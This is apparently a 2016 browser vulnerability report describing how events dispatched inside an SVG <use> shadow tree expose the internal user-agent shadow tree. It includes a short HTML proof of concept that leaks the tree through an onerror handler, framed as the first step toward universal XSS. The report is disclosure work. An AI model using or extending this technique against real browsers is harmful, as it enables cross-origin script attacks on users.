# Universal XSS by intercepting a UA shadow tree

> Reported by <mailto:marius.mlynski@gmail.com>, Jul 24 2016

## VULNERABILITY DETAILS

When an event is dispatched to an element in a SVG `<use>` shadow tree, `Event::currentTarget` returns the original corresponding node, but `Event::target` doesn't make any attempt to redirect access. Therefore, the tree can be trivially leaked like this:

```html
<svg>
  <g id="a">
    <image href="" onerror="if (event.currentTarget !== event.target) {alert(event.target.parentNode.parentNode)}"></image>
  </g>
  <use href="#a"></use>
</svg>

```

Gaining access to the internal shadow tree allows an attacker to manipulate it in a way that allows triggering focus events in theoretically impossible circumstances, which may lead to DOM tree corruption.
